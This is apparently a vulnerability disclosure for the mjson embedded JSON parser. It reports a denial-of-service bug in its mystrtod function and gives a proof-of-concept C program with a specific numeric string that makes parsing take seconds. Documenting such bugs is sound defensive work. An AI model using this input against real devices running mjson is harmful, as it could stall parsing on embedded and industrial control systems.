# Denial of Service in mjson when parsing certain text

### 1.Introduction

This is a bug related to Expected Behavior Violation in [mjson][1].

Specifically, we have encountered some cases where mjson takes an unusually long time (more than 10 seconds) to parse certain text, which is unexpected.

We also tested the same text against other JSON parsers like [cJSON][2] and [json][3]. These parsers were able to parse the text quickly and without any problems.

*Potential effect*: This may lead to some unexpected errors, e.g., Denial Of Service.
[mjson][1] is specifically designed to operate on resource-constrained embedded devices, such as microcontrollers used in critical systems like Industrial Control Systems. Any delay in parsing important data could have catastrophic consequences in such scenarios.


### 2.Trigger The Bug


+ Running environment
	* OS: Ubuntu (e.g., Ubuntu 18.04, 16.04, 22.04)

+ Source code required
	* `mjson.c`, `mjson.h` from https://github.com/cesanta/mjson and a `test.c` (see below)

+ Steps

	+ Prepare a `test.c` file
		```
		#include <stdio.h>  
		#include "mjson.h"

		int main() {
		    char *s = "8891110122900e913013935755114";
		    int ret = mjson(s, (int) strlen(s), NULL, NULL);
		    printf("res:%d\n", ret);
		    return 0;
		}
		```
		
	+ File structure (in the same directory)
		```
		- mjson.c
		- mjson.h
		- test.c
		```
	+ Compile and Run
		```
	 	clang test.c mjson.c -o test
	 	./test
		```
		It is evident that the process takes an unusually long time to complete. One can verify this by running the command `time ./test` to see the duration of the process.
		
	+ Analysis 
		We found that the root cause of the bug is an error in implementing of the function `mystrtod`. More specifically, the loop within the function has a total of 1,622,094,001 iterations.
		

[1]: https://github.com/cesanta/mjson
[2]: https://github.com/DaveGamble/cJSON
[3]: https://github.com/nlohmann/json


